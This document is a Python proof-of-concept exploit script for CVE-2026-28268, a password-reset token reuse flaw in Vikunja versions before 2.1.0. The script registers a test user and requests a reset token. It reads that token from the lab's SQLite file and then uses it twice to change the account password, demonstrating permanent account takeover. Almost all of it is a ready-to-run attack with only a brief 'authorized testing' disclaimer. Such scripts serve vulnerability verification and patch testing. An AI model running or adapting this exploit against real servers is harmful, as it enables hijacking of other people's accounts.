#!/usr/bin/env python3
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Exploit Title  : Vikunja Password Reset Token Reuse â€” Auth Bypass
# CVE            : CVE-2026-28268
# Vendor         : Vikunja
# Product        : Vikunja
# Affected       : < 2.1.0
# Type           : CWE-640 - Weak Password Recovery Mechanism
# CVSS           : 9.8 (Critical)
# Platform       : Multiple
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
"""
Vikunja Password Reset Token Reuse Exploit (Vector 1)

Demonstrates authentication bypass via password reset token reuse. The
vulnerability allows an attacker who obtains a password reset token to
reuse it indefinitely, even after the victim has used it.

ATTACK CHAIN:
  1. Register test user, request password reset token
  2. Extract token from SQLite (mailer disabled in lab)
  3. First use: reset password successfully
  4. Second use: reset password again with SAME token (EXPLOIT)

PREREQUISITES:
  - Vikunja < 2.1.0 with local auth enabled
  - Access to the SQLite database file (bind-mounted at ./data/vikunja.db)

REFERENCES:
  - CVE-2026-28268
  - GHSA-rfjg-6m84-crj2
"""

import sys
import os
import json
import base64
import sqlite3
import urllib.request
import urllib.error

def banner():
    print("=" * 70)
    print(" CVE-2026-28268: Vikunja Password Reset Token Reuse")
    print(" Critical Authentication Bypass - CVSS 9.8")
    print("=" * 70)
    print()

def http_request(url, method="GET", data=None, headers=None):
    """Make HTTP request using urllib (standard library)"""
    if headers is None:
        headers = {}
    
    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode('utf-8')
            headers['Content-Type'] = 'application/json'
        elif isinstance(data, str):
            data = data.encode('utf-8')
    
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    
    try:
        with urllib.request.urlopen(req) as response:
            body = response.read().decode('utf-8')
            return response.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8')
    except Exception as e:
        return None, str(e)

def register_user(base_url, username, email, password):
    """Register a new user account"""
    url = f"{base_url}/api/v1/register"
    data = {
        "username": username,
        "email": email,
        "password": password
    }
    
    status, body = http_request(url, method="POST", data=data)
    if status == 200:
        user_data = json.loads(body)
        return True, user_data
    else:
        return False, body

def login(base_url, username, password):
    """Login and get JWT token"""
    url = f"{base_url}/api/v1/login"
    data = {
        "username": username,
        "password": password
    }
    
    status, body = http_request(url, method="POST", data=data)
    if status == 200:
        login_data = json.loads(body)
        return True, login_data.get('token')
    else:
        return False, body

def request_password_reset(base_url, email):
    """Request a password reset token"""
    url = f"{base_url}/api/v1/user/password/token"
    data = {"email": email}
    
    status, body = http_request(url, method="POST", data=data)
    return status == 200, body

def reset_password(base_url, token, new_password):
    """Reset password using a token"""
    url = f"{base_url}/api/v1/user/password/reset"
    data = {
        "token": token,
        "new_password": new_password
    }
    
    status, body = http_request(url, method="POST", data=data)
    if status == 200:
        return True, json.loads(body).get('message', 'Success')
    else:
        return False, body

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(SCRIPT_DIR, "data", "vikunja.db")


def extract_token_from_db():
    """Extract the latest password reset token from SQLite database (bind-mounted at ./data)."""
    try:
        conn = sqlite3.connect(f"file:{DB_PATH}?mode=ro", uri=True)
        cur = conn.cursor()
        cur.execute("SELECT token FROM user_tokens WHERE kind=1 ORDER BY id DESC LIMIT 1")
        row = cur.fetchone()
        conn.close()
        return row[0] if row else None
    except (sqlite3.Error, OSError):
        return None

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 poc.py <target_ip> <port>")
        print("Example: python3 poc.py 172.18.0.2 3456")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    port = sys.argv[2]
    base_url = f"http://{target_ip}:{port}"
    
    banner()
    
    # Test credentials
    test_username = "poc_victim"
    test_email = "poc_victim@example.com"
    original_password = "original_pass_123"
    
    print("[Step 1] Registering test user...")
    success, result = register_user(base_url, test_username, test_email, original_password)
    if success:
        print(f"  âœ“ User registered: {test_username}")
        print(f"    User ID: {result.get('id')}")
    else:
        print(f"  âœ— Registration failed: {result}")
        print("    (This may be OK if user already exists)")
    print()
    
    print("[Step 2] Verifying login with original password...")
    success, token = login(base_url, test_username, original_password)
    if success:
        print(f"  âœ“ Login successful")
        print(f"    JWT: {token[:40]}...")
    else:
        print(f"  âœ— Login failed")
        print("    Aborting - cannot proceed without valid credentials")
        sys.exit(1)
    print()
    
    print("[Step 3] Requesting password reset token...")
    success, response = request_password_reset(base_url, test_email)
    if success:
        print(f"  âœ“ Password reset token requested")
        print(f"    Server response: {response}")
    else:
        print(f"  âœ— Failed to request reset token: {response}")
        sys.exit(1)
    print()
    
    print("[Step 4] Extracting token from SQLite database...")
    print("  (Since mailer is disabled, reading directly from DB)")
    reset_token = extract_token_from_db()
    if reset_token:
        print(f"  âœ“ Token extracted: {reset_token[:20]}...{reset_token[-20:]}")
    else:
        print("  âœ— Failed to extract token from database")
        print("    Make sure you have Docker access and the container is running")
        sys.exit(1)
    print()
    
    print("=" * 70)
    print(" EXPLOIT: Demonstrating Token Reuse Vulnerability")
    print("=" * 70)
    print()
    
    print("[Step 5] FIRST password reset (normal use)...")
    first_password = "hacked_password_1"
    success, message = reset_password(base_url, reset_token, first_password)
    if success:
        print(f"  âœ“ Password reset successful!")
        print(f"    Message: {message}")
    else:
        print(f"  âœ— Password reset failed: {message}")
        sys.exit(1)
    print()
    
    print("[Step 6] Verifying token was NOT deleted from database...")
    token_check = extract_token_from_db()
    if token_check == reset_token:
        print(f"  âš ï¸  TOKEN STILL EXISTS IN DATABASE (Bug 1 confirmed!)")
        print(f"     Token: {token_check[:20]}...{token_check[-20:]}")
    else:
        print(f"  âœ“ Token was deleted (vulnerability may be patched)")
        sys.exit(0)
    print()
    
    print("[Step 7] SECOND password reset with SAME token (EXPLOIT!)...")
    second_password = "hacked_password_2"
    success, message = reset_password(base_url, reset_token, second_password)
    if success:
        print(f"  ğŸš¨ AUTHENTICATION BYPASS CONFIRMED! ğŸš¨")
        print(f"     The same token was reused successfully!")
        print(f"     Message: {message}")
    else:
        print(f"  âœ— Token reuse failed (may be patched): {message}")
        sys.exit(0)
    print()
    
    print("[Step 8] Verifying password was actually changed...")
    print("  Testing login with second password...")
    success, new_token = login(base_url, test_username, second_password)
    if success:
        print(f"  âœ“ Login successful with second password")
        print(f"    JWT: {new_token[:40]}...")
    else:
        print(f"  âœ— Login failed with second password")
        print()
    
    print("  Testing login with first password (should fail)...")
    success, _ = login(base_url, test_username, first_password)
    if not success:
        print(f"  âœ“ First password no longer works (as expected)")
    else:
        print(f"  âœ— First password still works (unexpected)")
    print()
    
    print("=" * 70)
    print(" [+] CVE-2026-28268 FULLY CONFIRMED")
    print("=" * 70)
    print()
    print("Summary:")
    print("  - Password reset token was reused successfully after first use")
    print("  - Attacker can change victim's password multiple times with same token")
    print("  - Token is NEVER deleted from the database (Bug 1)")
    print("  - Cron cleanup preserves old tokens (Bug 2)")
    print()
    print("Impact: CVSS 9.8 Critical - Permanent account takeover")
    print("Fix: Upgrade to Vikunja v2.1.0 or later")
    print()

if __name__ == "__main__":
    main()
